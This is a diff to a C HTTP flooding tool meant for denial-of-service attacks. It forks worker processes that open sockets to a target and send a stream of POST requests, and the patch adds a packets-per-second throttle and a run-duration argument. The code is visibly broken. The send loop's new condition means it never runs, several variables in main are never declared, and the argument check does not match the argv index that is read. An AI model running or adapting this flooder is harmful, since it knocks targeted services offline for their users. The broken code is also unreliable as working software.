@@ -10,8 +10,8 @@
 #include <netinet/in.h>
 #include <arpa/inet.h>
 
-#define PPS 1000000000
-
+#define PPS 150000000
+int limiter;
 int make_socket(char *host, char *port) {
 	struct addrinfo hints, *servinfo, *p;
 	int sock, r;
@@ -64,7 +64,7 @@ void attack(char *host, char *port, int id) {
 	
 	while(1) {
 		
-		for(i=0; i != PPS; i++) {
+		for(i=0; i == PPS; i++) {
 			if(sockets[x] == 0)
 				sockets[x] = make_socket(host, port);
 			write(sockets[x], "POST / HTTP/1.1\r\n\r\n", 19);
@@ -77,6 +77,10 @@ void attack(char *host, char *port, int id) {
 		}
 		
 		fprintf(stderr, "[%i: Voly Sent]\n", id);
+		if(i >= limiter)
+		{
+			i=0;
+		}
 		
 	}
 	
@@ -99,13 +103,38 @@ int main(int argc, char **argv) {
 	int x;
 	
 	
-	if(argc !=3)
+	if(argc !=4)
 		cycle_identity();
 	for(x=0; x != THREADS; x++) {
 		if(fork())
 			attack(argv[1], argv[2], x);
 		
 	}
-	getc(stdin);
+	
+        int multiplier = 20;
+	fprintf(stdout, "Starting Flood...\n");
+	for(i = 0;i<(atoi(argv[4])*multiplier);i++)
+	{
+		usleep((1000/multiplier)*1000);
+		if((pps*multiplier) > maxpps)
+		{
+			if(1 > limiter)
+			{
+				sleeptime+=100;
+			} else {
+				limiter--;
+			}
+		} else {
+			limiter++;
+			if(sleeptime > 25)
+			{
+				sleeptime-=25;
+			} else {
+				sleeptime = 0;
+			}
+		}
+		pps = 0;
+	}
+
 	return 0;
 }
